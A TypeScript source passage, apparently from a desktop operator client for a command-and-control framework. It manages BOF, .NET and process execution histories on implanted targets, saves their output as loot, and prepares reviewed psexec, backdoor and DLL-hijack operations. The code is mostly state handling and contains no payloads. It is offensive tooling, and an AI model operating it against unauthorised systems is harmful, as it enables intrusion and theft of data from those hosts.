  private patchBofRecord(pool: BackendPool, target: TargetRef, original: BofExecutionRecord, patch: Partial<BofExecutionRecord>): BofExecutionRecord {
    const history = this.bofExecutionHistories.get(this.bofHistoryKey(pool, target));
    const index = history?.records.findIndex((record) => record.id === original.id) ?? -1;
    if (!history || index < 0) {
      // A peer may clear a running invocation before the result arrives. Return
      // the result to the initiating call without restoring it to shared history.
      const returned = cloneBofRecord({ ...original, ...patch });
      patch.stdout?.data.fill(0);
      patch.stderr?.data.fill(0);
      return returned;
    }
    const previous = history.records[index]!;
    const next = cloneBofRecord({ ...previous, ...patch });
    history.records[index] = next;
    patch.stdout?.data.fill(0);
    patch.stderr?.data.fill(0);
    clearBofRecord(previous);
    const returned = cloneBofRecord(next);
    this.trimBofHistory(history);
    this.publishBofHistoryChanged(history);
    return returned;
  }

  private trimBofHistory(history: { records: BofExecutionRecord[] }): void {
    let bytes = history.records.reduce((sum, record) => sum +
      (record.stdout?.data.byteLength ?? 0) + (record.stderr?.data.byteLength ?? 0), 0);
    while (history.records.length > 50 || bytes > 16 * 1_024 * 1_024) {
      const removed = history.records.pop();
      if (!removed) break;
      bytes -= (removed.stdout?.data.byteLength ?? 0) + (removed.stderr?.data.byteLength ?? 0);
      clearBofRecord(removed);
    }
  }

  private publishBofHistoryChanged(history: InternalBofExecutionHistory): void {
    history.revision += 1;
    for (const context of this.windows.values()) {
      if (context.poolKey !== history.poolKey || !context.activeTarget ||
        !sameTargetRefIdentity(context.activeTarget, history.target)) continue;
      const pool = this.pools.get(context.poolKey);
      if (!pool || pool.epoch !== history.epoch) continue;
      const contents = webContents.fromId(context.contentsId);
      if (!contents || contents.isDestroyed()) continue;
      try { contents.send(IPC.bofExecutionHistoryChanged, { ...context.activeTarget }, history.revision); }
      catch { /* Advisory invalidation; the next snapshot is authoritative. */ }
    }
  }

  private bofOutputForActiveTarget(
    contentsId: number,
    pool: BackendPool,
    input: BofOutputInput,
  ): { context: WindowContext; target: RevalidatedTarget; record: BofExecutionRecord; data: Buffer } {
    const { context, target } = this.requireSelectedExecutionTarget(contentsId, pool);
    const history = this.bofExecutionHistories.get(this.bofHistoryKey(pool, target.ref));
    const record = history?.records.find((item) => item.id === input.id);
    if (!record || (record.state !== "completed" && record.state !== "failed")) throw new Error("The BOF output is unavailable for the current target");
    const stdout = record.stdout?.data;
    const stderr = record.stderr?.data;
    const data = input.stream === "combined"
      ? stdout && stderr ? Buffer.concat([stdout, stderr]) : stdout ? Buffer.from(stdout) : stderr ? Buffer.from(stderr) : undefined
      : input.stream === "stdout" && stdout ? Buffer.from(stdout)
        : input.stream === "stderr" && stderr ? Buffer.from(stderr) : undefined;
    if (!data || data.length > 2 * 1_024 * 1_024) throw new Error("The requested BOF output stream is unavailable");
    return { context, target, record, data };
  }

  async saveBofOutput(sender: WebContents, input: BofOutputInput): Promise<OperationResult<SaveExecutionResultResult>> {
    let data: Buffer | undefined;
    try {
      return await this.withExecutionPool(sender.id, async (pool, assertBinding) => {
        const selected = this.bofOutputForActiveTarget(sender.id, pool, input);
        data = selected.data;
        const owner = requireOwnerWindow(sender);
        const selection = await dialog.showSaveDialog(owner, {
          title: "Save BOF output",
          defaultPath: safeArtifactFileName(`${selected.record.commandName}-${input.stream}-${input.id}.txt`),
        });
        if (selection.canceled || !selection.filePath) return { saved: false };
        const assertCurrent = (): void => {
          assertBinding();
          if (!selected.context.activeTarget || !sameTargetRefIdentity(selected.context.activeTarget, selected.target.ref) ||
            this.bofExecutionHistories.get(this.bofHistoryKey(pool, selected.target.ref))?.records.find((record) => record.id === input.id) !== selected.record) {
            throw new Error("The BOF output no longer belongs to the active target");
          }
        };
        assertCurrent();
        const intent = await this.reserveSessionSaveIntent(selection.filePath);
        assertCurrent();
        await this.commitSessionSaveIntent(intent, data!, assertCurrent);
        return { saved: true, fileName: safeArtifactFileName(basename(intent.destinationPath)) };
      });
    } finally {
      data?.fill(0);
    }
  }

  async addBofOutputToLoot(contentsId: number, input: AddBofOutputToLootInput): Promise<OperationResult<LootSummary>> {
    let data: Buffer | undefined;
    let loot: clientpb.Loot | undefined;
    let response: clientpb.Loot | undefined;
    try {
      return await this.withExecutionPool(contentsId, async (pool, assertBinding) => {
        const selected = this.bofOutputForActiveTarget(contentsId, pool, input);
        data = selected.data;
        const assertCurrent = (): void => {
          assertBinding();
          if (!selected.context.activeTarget || !sameTargetRefIdentity(selected.context.activeTarget, selected.target.ref) ||
            this.bofExecutionHistories.get(this.bofHistoryKey(pool, selected.target.ref))?.records.find((record) => record.id === input.id) !== selected.record) {
            throw new Error("The BOF output no longer belongs to the active target");
          }
        };
        const requestedName = input.name.trim();
        if (requestedName.length > OPERATOR_DATA_LIMITS.nameCharacters) throw new Error("Loot name is invalid");
        const isText = isProbablyTextLoot(data);
        const fileName = safeArtifactFileName(`bof-${input.stream}-${input.id}.${isText ? "txt" : "bin"}`);
        loot = clientpb.Loot.create({
          Name: requestedName || fileName,
          OriginHostUUID: selected.target.target.hostId,
          FileType: isText ? clientpb.FileType.TEXT : clientpb.FileType.BINARY,
          File: commonpb.File.create({ Name: fileName, Data: data }),
        });
        assertCurrent();
        try {
          response = await pool.client.lootAdd(loot);
          assertCurrent();
          return lootSummary(response);
        } catch {
          throw new Error("The BOF output may have been added to loot; refresh loot before retrying");
        }
      });
    } finally {
      data?.fill(0);
      loot?.File?.Data.fill(0);
      response?.File?.Data.fill(0);
    }
  }

  async listDotNetExecutionHistory(
    contentsId: number,
  ): Promise<OperationResult<DotNetExecutionHistorySnapshot>> {
    return this.withExecutionPool(contentsId, async (pool, assertBinding) => {
      const { target } = this.requireSelectedExecutionTarget(contentsId, pool);
      const history = this.dotNetExecutionHistories.get(processExecutionHistoryKey(pool.key, pool.epoch, target.ref));
      assertBinding();
      return {
        target: { ...target.ref },
        revision: history?.revision ?? 0,
        records: history?.entries.map(({ record }) => cloneDotNetExecutionRecord(record)) ?? [],
      };
    });
  }

  async clearDotNetExecutionHistory(
    contentsId: number,
    input: ClearDotNetExecutionHistoryInput,
  ): Promise<OperationResult> {
    const result = await this.withExecutionPool(contentsId, async (pool, assertBinding) => {
      const { target } = this.requireSelectedExecutionTarget(contentsId, pool);
      const history = this.dotNetExecutionHistories.get(processExecutionHistoryKey(pool.key, pool.epoch, target.ref));
      assertBinding();
      if (!history) return;
      if (input.id === undefined) {
        if (history.entries.length === 0) return;
        for (const entry of history.entries) this.releaseDotNetExecutionRecord(entry.record);
        history.entries = [];
      } else {
        const index = history.entries.findIndex(({ record }) => record.id === input.id);
        if (index < 0) return;
        const [removed] = history.entries.splice(index, 1);
        this.releaseDotNetExecutionRecord(removed!.record);
      }
      this.publishDotNetExecutionHistoryChanged(history);
    });
    return result.ok ? { ok: true } : result;
  }

  private beginDotNetExecutionHistory(
    pool: BackendPool,
    target: RevalidatedTarget,
    journal: TargetOperationRecord,
    plan: InternalExecutionPlan,
  ): string {
    const key = processExecutionHistoryKey(pool.key, pool.epoch, target.ref);
    let history = this.dotNetExecutionHistories.get(key);
    if (!history) {
      history = { key, poolKey: pool.key, epoch: pool.epoch, target: { ...target.ref }, revision: 0, entries: [] };
      this.dotNetExecutionHistories.set(key, history);
    }
    if (plan.draft.operationId !== "execution.assembly") throw new Error("Expected a reviewed .NET assembly");
    const record: DotNetExecutionRecord = {
      id: journal.requestId,
      startedAt: journal.createdAt,
      assemblyName: plan.review.artifacts.find((artifact) => artifact.role === "assembly")?.fileName ?? ".NET assembly",
      args: [...plan.draft.args],
      sourceKind: plan.assemblySourceKind ?? "file",
      state: "running",
    };
    history.entries.unshift({ order: ++this.nextDotNetExecutionHistoryOrder, record });
    this.dotNetExecutionHistoryEntryCount += 1;
    this.publishDotNetExecutionHistoryChanged(history);
    this.evictDotNetExecutionHistory();
    return key;
  }

  private updateDotNetExecutionHistory(key: string, id: string, patch: Partial<DotNetExecutionRecord>): void {
    const history = this.dotNetExecutionHistories.get(key);
    const entry = history?.entries.find(({ record }) => record.id === id);
    if (!history || !entry) return; // A cleared or evicted invocation stays cleared.
    const previous = entry.record;
    const next = cloneDotNetExecutionRecord({ ...previous, ...patch });
    entry.record = next;
    this.dotNetExecutionHistoryOutputBytes += dotNetExecutionOutputBytes(next) - dotNetExecutionOutputBytes(previous);
    clearDotNetExecutionOutput(previous);
    this.publishDotNetExecutionHistoryChanged(history);
    this.evictDotNetExecutionHistory();
  }

  private evictDotNetExecutionHistory(): void {
    while (
      this.dotNetExecutionHistoryEntryCount > MAX_DOTNET_EXECUTION_HISTORY_ENTRIES ||
      this.dotNetExecutionHistoryOutputBytes > MAX_DOTNET_EXECUTION_HISTORY_OUTPUT_BYTES
    ) {
      let oldestHistory: InternalDotNetExecutionHistory | undefined;
      let oldestOrder = Number.POSITIVE_INFINITY;
      for (const history of this.dotNetExecutionHistories.values()) {
        const last = history.entries.at(-1);
        if (last && last.order < oldestOrder) {
          oldestHistory = history;
          oldestOrder = last.order;
        }
      }
      if (!oldestHistory) break;
      const removed = oldestHistory.entries.pop()!;
      this.releaseDotNetExecutionRecord(removed.record);
      this.publishDotNetExecutionHistoryChanged(oldestHistory);
    }
  }

  private releaseDotNetExecutionRecord(record: DotNetExecutionRecord): void {
    this.dotNetExecutionHistoryEntryCount -= 1;
    this.dotNetExecutionHistoryOutputBytes -= dotNetExecutionOutputBytes(record);
    clearDotNetExecutionOutput(record);
  }

  private publishDotNetExecutionHistoryChanged(history: InternalDotNetExecutionHistory): void {
    history.revision += 1;
    for (const context of this.windows.values()) {
      if (
        context.poolKey !== history.poolKey ||
        !context.activeTarget ||
        !sameTargetRefIdentity(context.activeTarget, history.target)
      ) continue;
      const pool = this.pools.get(context.poolKey);
      if (!pool || pool.epoch !== history.epoch) continue;
      const contents = webContents.fromId(context.contentsId);
      if (!contents || contents.isDestroyed()) continue;
      try {
        contents.send(IPC.dotNetExecutionHistoryChanged, { ...context.activeTarget }, history.revision);
      } catch {
        // The next snapshot is authoritative if an advisory invalidation is missed.
      }
    }
  }

  async listProcessExecutionHistory(
    contentsId: number,
  ): Promise<OperationResult<ProcessExecutionHistorySnapshot>> {
    return this.withExecutionPool(contentsId, async (pool, assertBinding) => {
      const { target } = this.requireSelectedSessionProcessHistory(contentsId, pool);
      const bucket = this.processExecutionHistories.get(processExecutionHistoryKey(pool.key, pool.epoch, target.ref));
      assertBinding();
      return {
        target: { ...target.ref },
        revision: bucket?.revision ?? 0,
        records: bucket?.entries.map(({ record }) => cloneProcessExecutionRecord(record)) ?? [],
      };
    });
  }

  async clearProcessExecutionHistory(
    contentsId: number,
    input: ClearProcessExecutionHistoryInput,
  ): Promise<OperationResult> {
    const result = await this.withExecutionPool(contentsId, async (pool, assertBinding) => {
      const { target } = this.requireSelectedSessionProcessHistory(contentsId, pool);
      const bucket = this.processExecutionHistories.get(processExecutionHistoryKey(pool.key, pool.epoch, target.ref));
      assertBinding();
      if (!bucket) return;
      if (input.id === undefined) {
        if (bucket.entries.length === 0) return;
        for (const entry of bucket.entries) this.releaseProcessExecutionRecord(entry.record);
        bucket.entries = [];
      } else {
        const index = bucket.entries.findIndex(({ record }) => record.id === input.id);
        if (index < 0) return;
        const [removed] = bucket.entries.splice(index, 1);
        this.releaseProcessExecutionRecord(removed!.record);
      }
      this.publishProcessExecutionHistoryChanged(bucket);
    });
    return result.ok ? { ok: true } : result;
  }

  private requireSelectedSessionProcessHistory(
    contentsId: number,
    pool: BackendPool,
  ): { context: WindowContext; target: RevalidatedTarget } {
    const selected = this.requireSelectedExecutionTarget(contentsId, pool);
    if (selected.target.target.mode !== "session") {
      throw new Error("Select an active session before using process execution history");
    }
    return selected;
  }

  /** A process or assembly result is shared only with windows on the same exact target. */
  private sharedExecutionHistoryResult(
    contentsId: number,
    requestId: string,
  ): SharedExecutionHistoryResult | undefined {
    const context = this.requireWindow(contentsId);
    const pool = context.poolKey ? this.pools.get(context.poolKey) : undefined;
    if (!pool || !["connected", "degraded", "reconnecting"].includes(pool.snapshot.connection.status)) return undefined;
    if (!context.activeTarget || context.activeTarget.backendEpoch !== pool.epoch) return undefined;
    const selected = this.requireSelectedExecutionTarget(contentsId, pool);
    const historyKey = processExecutionHistoryKey(pool.key, pool.epoch, selected.target.ref);
    const processHistory = selected.target.target.mode === "session"
      ? this.processExecutionHistories.get(historyKey) : undefined;
    const dotNetHistory = this.dotNetExecutionHistories.get(historyKey);
    const processRecord = processHistory?.entries.find(({ record }) => record.id === requestId)?.record;
    const dotNetRecord = dotNetHistory?.entries.find(({ record }) => record.id === requestId)?.record;
    const record = processRecord?.result?.operationId === "execution.process"
      ? processRecord : dotNetRecord?.result?.operationId === "execution.assembly" ? dotNetRecord : undefined;
    if (!record?.result || record.result.requestId !== requestId) {
      return undefined;
    }
    const connectionAttempt = context.connectionAttempt;
    const assertCurrent = (): void => {
      if (
        this.windows.get(contentsId) !== context ||
        this.pools.get(pool.key) !== pool ||
        pool.epoch !== selected.target.ref.backendEpoch ||
        context.poolKey !== pool.key ||
        context.connectionAttempt !== connectionAttempt ||
        !context.activeTarget ||
        !sameTargetRefIdentity(context.activeTarget, selected.target.ref) ||
        !pool.targetStore.revalidateTargetRef(selected.target.ref, pool.epoch) ||
        !(processHistory?.entries.some((entry) => entry.record === record) ||
          dotNetHistory?.entries.some((entry) => entry.record === record))
      ) throw new Error("The execution result no longer belongs to the active target");
    };
    assertCurrent();
    return { context, pool, target: selected.target, record, assertCurrent };
  }

  private sharedExecutionHistoryOutput(
    record: ProcessExecutionRecord | DotNetExecutionRecord,
    stream: "stdout" | "stderr" | "combined",
  ): { data: Buffer; truncated: boolean } {
    const output = record.result?.output?.find((item) => item.stream === stream);
    const maximumBytes = stream === "combined"
      ? 2 * EXECUTION_WORKBENCH_OUTPUT_MAX_BYTES
      : EXECUTION_WORKBENCH_OUTPUT_MAX_BYTES;
    if (!output || !Number.isFinite(Date.parse(output.expiresAt)) ||
      Date.parse(output.expiresAt) <= this.now() || output.size > maximumBytes) {
      throw new Error("The requested execution output is unavailable");
    }
    const stdout = record.stdout?.data;
    const stderr = record.stderr?.data;
    const data = stream === "combined"
      ? stdout && stderr ? Buffer.concat([stdout, stderr]) : undefined
      : stream === "stdout" && stdout ? Buffer.from(stdout)
        : stream === "stderr" && stderr ? Buffer.from(stderr) : undefined;
    if (!data || data.byteLength !== output.size) {
      data?.fill(0);
      throw new Error("The requested execution output is unavailable");
    }
    return { data, truncated: output.truncated };
  }

  private async refreshSharedDotNetBeaconResult(shared: SharedExecutionHistoryResult): Promise<ExecutionActionResult> {
    const previous = shared.record.result;
    if (
      !("assemblyName" in shared.record) ||
      !previous ||
      previous.operationId !== "execution.assembly" ||
      !previous.taskId ||
      shared.target.target.mode !== "beacon"
    ) throw new Error("The .NET execution result is unavailable for the current target");
    let task: clientpb.BeaconTask | undefined;
    let decoded: DecodedExecutionBeaconTask | undefined;
    let transferred = false;
    try {
      task = await shared.pool.client.fetchBeaconTask(previous.taskId);
      shared.assertCurrent();
      if (task.ID !== previous.taskId || task.BeaconID !== shared.target.target.id) {
        throw new Error("The .NET execution task no longer matches the selected target");
      }
      const state = task.State.trim().toLowerCase();
      if (state === "pending" || state === "sent") return cloneExecutionActionResult(previous);
      const next = (state === "failed" || state === "canceled" || state === "cancelled")
        ? {
          requestId: previous.requestId,
          operationId: "execution.assembly" as const,
          state: state === "failed" ? "failed" as const : "canceled" as const,
          message: state === "failed"
            ? "The selected target rejected the .NET assembly execution."
            : "The beacon .NET assembly task was canceled before completion.",
          taskId: previous.taskId,
        }
        : undefined;
      if (next) {
        shared.assertCurrent();
        return this.retainExecutionResult(shared.context, shared.pool, shared.target, next);
      }
      if (state !== "completed") return cloneExecutionActionResult(previous);
      try {
        decoded = decodeExecutionBeaconTask({
          operationId: "execution.assembly",
          description: task.Description,
          response: task.Response,
        });
      } catch (error) {
        shared.assertCurrent();
        const uncertain: ExecutionActionResult = {
          requestId: previous.requestId,
          operationId: "execution.assembly",
          state: error instanceof ExecutionRemoteRejectedError ? "failed" : "outcome-unknown",
          message: error instanceof ExecutionRemoteRejectedError
            ? "The selected target rejected the .NET assembly execution."
            : "The beacon .NET task completed, but its exact result could not be confirmed safely.",
          taskId: previous.taskId,
        };
        if (uncertain.state === "outcome-unknown") {
          // Keep a peer's uncertain result in the shared history only. A peer
          // has no originating operation journal, so retaining it locally
          // would make the next refresh take the journal-only path.
          this.updateDotNetExecutionHistory(
            processExecutionHistoryKey(shared.pool.key, shared.pool.epoch, shared.target.ref),
            previous.requestId,
            { state: uncertain.state, result: uncertain },
          );
          return cloneExecutionActionResult(uncertain);
        }
        return this.retainExecutionResult(shared.context, shared.pool, shared.target, uncertain);
      }
      if (decoded.kind !== "action") throw new Error("The .NET execution task returned the wrong result type");
      shared.assertCurrent();
      const retained = this.retainExecutionResult(shared.context, shared.pool, shared.target, {
        requestId: previous.requestId,
        operationId: "execution.assembly",
        state: "completed",
        message: decoded.value.summary,
        taskId: previous.taskId,
        ...(decoded.value.pid === undefined ? {} : { pid: decoded.value.pid }),
        ...(decoded.value.exitCode === undefined ? {} : { exitCode: decoded.value.exitCode }),
      }, {
        ...(decoded.value.stdout ? { stdout: { data: decoded.value.stdout, truncated: decoded.value.stdoutTruncated === true } } : {}),
        ...(decoded.value.stderr ? { stderr: { data: decoded.value.stderr, truncated: decoded.value.stderrTruncated === true } } : {}),
      });
      transferred = true;
      return retained;
    } finally {
      if (!transferred && decoded?.kind === "action") {
        decoded.value.stdout?.fill(0);
        decoded.value.stderr?.fill(0);
      }
      task?.Request.fill(0);
      task?.Response.fill(0);
    }
  }

  private beginProcessExecutionHistory(
    pool: BackendPool,
    target: RevalidatedTarget,
    journal: TargetOperationRecord,
    draft: Extract<ExecutionActionDraft, { operationId: "execution.process" }>,
  ): string {
    const key = processExecutionHistoryKey(pool.key, pool.epoch, target.ref);
    let bucket = this.processExecutionHistories.get(key);
    if (!bucket) {
      bucket = { key, poolKey: pool.key, epoch: pool.epoch, target: { ...target.ref }, revision: 0, entries: [] };
      this.processExecutionHistories.set(key, bucket);
    }
    const record: ProcessExecutionRecord = {
      id: journal.requestId,
      startedAt: journal.createdAt,
      path: draft.path,
      args: [...draft.args],
      state: "running",
    };
    bucket.entries.unshift({ order: ++this.nextProcessExecutionHistoryOrder, record });
    this.processExecutionHistoryEntryCount += 1;
    this.publishProcessExecutionHistoryChanged(bucket);
    this.evictProcessExecutionHistory();
    return key;
  }

  private updateProcessExecutionHistory(
    key: string,
    id: string,
    patch: Partial<ProcessExecutionRecord>,
  ): void {
    const bucket = this.processExecutionHistories.get(key);
    if (!bucket) return;
    const entry = bucket.entries.find(({ record }) => record.id === id);
    if (!entry) return; // A cleared or evicted invocation must never reappear.
    const previous = entry.record;
    const next = cloneProcessExecutionRecord({ ...previous, ...patch });
    entry.record = next;
    this.processExecutionHistoryOutputBytes += processExecutionOutputBytes(next) - processExecutionOutputBytes(previous);
    clearProcessExecutionOutput(previous);
    this.publishProcessExecutionHistoryChanged(bucket);
    this.evictProcessExecutionHistory();
  }

  private evictProcessExecutionHistory(): void {
    while (
      this.processExecutionHistoryEntryCount > MAX_PROCESS_EXECUTION_HISTORY_ENTRIES ||
      this.processExecutionHistoryOutputBytes > MAX_PROCESS_EXECUTION_HISTORY_OUTPUT_BYTES
    ) {
      let oldestBucket: InternalProcessExecutionHistory | undefined;
      let oldestOrder = Number.POSITIVE_INFINITY;
      for (const bucket of this.processExecutionHistories.values()) {
        const last = bucket.entries.at(-1);
        if (last && last.order < oldestOrder) {
          oldestBucket = bucket;
          oldestOrder = last.order;
        }
      }
      if (!oldestBucket) break;
      const removed = oldestBucket.entries.pop()!;
      this.releaseProcessExecutionRecord(removed.record);
      this.publishProcessExecutionHistoryChanged(oldestBucket);
    }
  }

  private releaseProcessExecutionRecord(record: ProcessExecutionRecord): void {
    this.processExecutionHistoryEntryCount -= 1;
    this.processExecutionHistoryOutputBytes -= processExecutionOutputBytes(record);
    clearProcessExecutionOutput(record);
  }

  private publishProcessExecutionHistoryChanged(bucket: InternalProcessExecutionHistory): void {
    bucket.revision += 1;
    for (const context of this.windows.values()) {
      if (
        context.poolKey !== bucket.poolKey ||
        !context.activeTarget ||
        !sameTargetRefIdentity(context.activeTarget, bucket.target)
      ) continue;
      const pool = this.pools.get(context.poolKey);
      if (!pool || pool.epoch !== bucket.epoch) continue;
      const contents = webContents.fromId(context.contentsId);
      if (!contents || contents.isDestroyed()) continue;
      try {
        contents.send(IPC.processExecutionHistoryChanged, { ...context.activeTarget }, bucket.revision);
      } catch {
        // An invalidation is advisory; a newly loaded renderer reads the authoritative snapshot.
      }
    }
  }

  async prepareExecutionAction(
    sender: WebContents,
    input: PrepareExecutionActionInput,
  ): Promise<OperationResult<ExecutionActionPlan>> {
    const admissionId = randomUUID();
    let admittedContext: WindowContext | undefined;
    const stagedArtifacts: Array<InternalExecutionArtifact & { role: ExecutionArtifactRole }> = [];
    let planCommitted = false;
    try {
      const context = this.requireWindow(sender.id);
      this.admitExecutionRequest(context, admissionId);
      admittedContext = context;
      return await this.withExecutionPool(sender.id, async (pool, assertBinding) => {
        const { target } = this.requireSelectedExecutionTarget(sender.id, pool);
        const selectedRef = { ...target.ref };
        const assertCurrent = (): RevalidatedTarget => {
          assertBinding();
          const currentContext = this.requireWindow(sender.id);
          if (
            currentContext !== context ||
            !currentContext.activeTarget ||
            !sameTargetRefIdentity(currentContext.activeTarget, selectedRef)
          ) throw new Error("The selected target changed while the execution review was being prepared");
          const current = pool.targetStore.revalidateTargetRef(selectedRef, pool.epoch);
          if (!current) throw new Error("The selected target is no longer available");
          if (current.target.mode === "session" && current.target.liveness !== "active") {
            throw new Error("The selected session is no longer active");
          }
          return current;
        };
        const descriptor = assertExecutionOperationSupported(input.draft.operationId, target.target);
        if (executionDraftUsesProfile(input.draft)) {
          await pool.refreshDomains(["profiles"]);
          assertCurrent();
        }
        if (input.draft.operationId === "execution.psexec" && input.draft.source.kind === "profile") {
          const profile = pool.profile(input.draft.source.profileName);
          if (!profile.Config) throw new Error("The selected service profile has no implant configuration");
        } else if (input.draft.operationId === "execution.backdoor") {
          const profile = pool.profile(input.draft.profileName);
          if (!profile.Config) throw new Error("The selected backdoor profile has no implant configuration");
        } else if (input.draft.operationId === "execution.dll-hijack" && input.draft.source.kind === "profile") {
          const profile = pool.profile(input.draft.source.profileName);
          if (!profile.Config) throw new Error("The selected DLL profile has no implant configuration");
        }
        this.pruneExecutionPlans(context);
        if (context.executionPlans.size >= MAX_WINDOW_EXECUTION_PLANS) {
          throw new Error("Too many execution reviews are already awaiting confirmation");
        }
        const owner = requireOwnerWindow(sender);
        for (const requested of executionArtifactSelections(input.draft)) {
          if (owner.isDestroyed()) throw new Error("The application window is no longer available");
          let selectedFile: { data: Buffer };
          let selectedFileName: string;
          if (requested.role === "assembly" && input.assemblySource?.kind === "armory") {
            const source = input.assemblySource;
            const { entries } = await installedDotNetAssemblies(this.clientRootDirectory, target.target, selectedRef);
            assertCurrent();
            const entry = entries.find((candidate) => candidate.dto.id === source.id && candidate.dto.available);
            if (!entry) throw new Error("The selected Armory assembly is unavailable; refresh the catalog");
            selectedFileName = safeArtifactFileName(entry.dto.fileName);
            selectedFile = { data: await readInstalledDotNetAssembly(entry) };
          } else if (requested.role === "assembly" && input.assemblySource?.kind === "file") {
            const file = context.dotNetFile;
            if (!file || file.token !== input.assemblySource.token || file.expiresAt <= this.now() ||
              !sameTargetRefIdentity(file.target, selectedRef)) {
              throw new Error("The selected .NET file is unavailable or expired; open it again");
            }
            delete context.dotNetFile;
            if (context.dotNetFileTimer) clearTimeout(context.dotNetFileTimer);
            delete context.dotNetFileTimer;
            selectedFile = { data: file.data };
            selectedFileName = file.fileName;
          } else {
            let selection;
            try {
              selection = await dialog.showOpenDialog(owner, {
                title: requested.title,
                properties: ["openFile"],
                ...(requested.extensions.length > 0
                  ? { filters: [{ name: requested.title, extensions: requested.extensions }] }
                  : {}),
              });
            } catch {
              throw new Error("Could not open the native execution file picker");
            }
            assertCurrent();
            const filePath = selection.filePaths[0];
            if (selection.canceled || !filePath) throw new Error("Execution file selection was canceled");
            selectedFileName = safeArtifactFileName(basename(filePath));
            try {
              selectedFile = await readBoundedRegularFile(filePath, {
                label: requested.title,
                maxBytes: requested.maximumBytes,
              });
            } catch {
              throw new Error("Could not read the selected execution file");
            }
          }
          try {
            assertCurrent();
            if (requested.role === "assembly" && selectedFile.data.length === 0) {
              throw new Error("The selected .NET assembly is empty");
            }
            if (requested.role === "assembly" && input.assemblySource &&
              input.draft.operationId === "execution.assembly" &&
              input.draft.isDll !== /\.dll$/iu.test(selectedFileName)) {
              throw new Error("The assembly type changed; select the .NET assembly again");
            }
            const scope = this.executionArtifactScope(
              context,
              pool,
              target,
              input.draft.operationId,
              requested.role,
            );
            const metadata = this.executionArtifacts.storeInput({
              scope,
              data: selectedFile.data,
              mediaType: "application/octet-stream",
              suggestedBasename: selectedFileName,
            });
            stagedArtifacts.push({ role: requested.role, scope, handle: metadata.handle });
          } finally {
            selectedFile.data.fill(0);
          }
        }
        const current = assertCurrent();
        const requestedIdentity = requestedExecutionIdentity(input.draft);
        let currentIdentity: string | undefined;
        if (requestedIdentity && current.target.mode === "session") {
          let identityResponse;
          try {
            identityResponse = await pool.client.currentTokenOwnerSession(
              current.target.id,
              descriptor.timeoutSeconds,
            );
          } catch {
            throw new Error("The current token identity could not be verified for this review");
          }
          const rebound = assertCurrent();
          if (identityResponse.Response?.Err?.trim()) {
            throw new Error("The current token identity could not be verified for this review");
          }
          const reportedIdentity = identityResponse.Output?.trim();
          if (!reportedIdentity) {
            throw new Error("The current token identity could not be verified for this review");
          }
          currentIdentity = boundedText(reportedIdentity, MAX_SUMMARY_TEXT);
          if (!sameTargetRefIdentity(rebound.ref, selectedRef)) {
            throw new Error("The selected target changed while the execution review was being prepared");
          }
        }
        const token = randomUUID();
        const expiresAt = this.now() + EXECUTION_PLAN_TTL_MS;
        const artifacts = stagedArtifacts.map((artifact) => {
          const metadata = this.executionArtifacts.metadata(artifact.scope, artifact.handle);
          return {
            role: artifact.role,
            fileName: metadata.suggestedBasename,
            mediaType: metadata.mediaType,
            size: metadata.size,
            sha256: metadata.sha256,
          };
        });
        const review: ExecutionActionPlan = {
          token,
          operationId: input.draft.operationId,
          expiresAt: new Date(expiresAt).toISOString(),
          risk: descriptor.risk,
          target: {
            backend: operationBackendSummary(context, pool),
            target: { ...current.target },
            fingerprint: current.ref.fingerprint,
          },
          warning: executionWarning(input.draft),
          fields: executionReviewFields(input.draft),
          artifacts,
          ...(currentIdentity ? { currentIdentity } : {}),
          ...(requestedIdentity ? { requestedIdentity } : {}),
        };
        const plan: InternalExecutionPlan = {
          token,
          expiresAt,
          contentsId: sender.id,
          poolKey: pool.key,
          epoch: pool.epoch,
          connectionAttempt: context.connectionAttempt,
          target: selectedRef,
          journalTarget: resolvedExecutionOperationTarget(context, pool, current),
          draft: input.draft,
          artifacts: [...stagedArtifacts],
          review,
          ...(input.draft.operationId === "execution.assembly"
            ? { assemblySourceKind: input.assemblySource?.kind ?? "file" }
            : {}),
        };
        context.executionPlans.set(token, plan);
        const timer = setTimeout(() => {
          const currentContext = this.windows.get(sender.id);
          if (currentContext?.executionPlans.get(token) === plan) this.revokeExecutionPlan(currentContext, token);
        }, EXECUTION_PLAN_TTL_MS);
        timer.unref?.();
        context.executionPlanTimers.set(token, timer);
        planCommitted = true;
        return review;
      });
    } catch (error) {
      return { ok: false, error: executionBoundaryError(error) };
    } finally {
      if (!planCommitted) {
        clearExecutionDraftSecrets(input.draft);
        for (const artifact of stagedArtifacts) {
          try { this.executionArtifacts.remove(artifact.scope, artifact.handle); } catch { /* already revoked */ }
        }
      }
      admittedContext?.executionAdmissions.delete(admissionId);
      this.executionGlobalAdmissions.delete(admissionId);
    }
  }

  async discardExecutionPlan(
    contentsId: number,
    input: ExecuteExecutionPlanInput,
  ): Promise<OperationResult> {
    try {
      const context = this.requireWindow(contentsId);
      const plan = context.executionPlans.get(input.token);
      if (!plan || plan.contentsId !== contentsId) throw new Error("The execution review is unavailable or expired");
      this.revokeExecutionPlan(context, input.token);
      return { ok: true };
    } catch (error) {
      return { ok: false, error: executionBoundaryError(error) };
    }
  }

  async runExecutionRead(
    contentsId: number,
    input: RunExecutionReadInput,
  ): Promise<OperationResult<ExecutionReadResult>> {
    const admissionId = randomUUID();
    let admittedContext: WindowContext | undefined;
    try {
      const context = this.requireWindow(contentsId);
      this.admitExecutionRequest(context, admissionId);
      admittedContext = context;
      return await this.withExecutionPool(contentsId, async (pool, assertBinding) => {
        const { target } = this.requireSelectedExecutionTarget(contentsId, pool);
        const selectedRef = { ...target.ref };
        const descriptor = assertExecutionOperationSupported(input.operationId, target.target);
        const engine = this.requireOperationEngine(contentsId, context, pool);
        if (target.target.mode === "beacon") {
          assertExecutionBeaconReadRequest(input);
        }
        const assertCurrent = (): void => {
          assertBinding();
          if (
            this.windows.get(contentsId) !== context ||
            !context.activeTarget ||
            !sameTargetRefIdentity(context.activeTarget, selectedRef) ||
            !pool.targetStore.revalidateTargetRef(selectedRef, pool.epoch)
          ) throw new Error("The selected target changed while the execution read was running");
        };
        if (input.taskId) {
          if (target.target.mode !== "beacon") {
            throw new Error("The selected target cannot refresh a beacon execution task");
          }
          const refreshed = await this.refreshExecutionBeaconTask({
            context,
            pool,
            target,
            engine,
            taskId: input.taskId,
            operationId: input.operationId,
            readInput: input,
            assertCurrent,
          });
          try {
            assertCurrent();
          } catch (error) {
            clearRefreshedExecutionBuffers(refreshed);
            throw error;
          }
          switch (refreshed.state) {
            case "decoded":
              if (refreshed.decoded.kind !== "read") {
                clearRefreshedExecutionBuffers(refreshed);
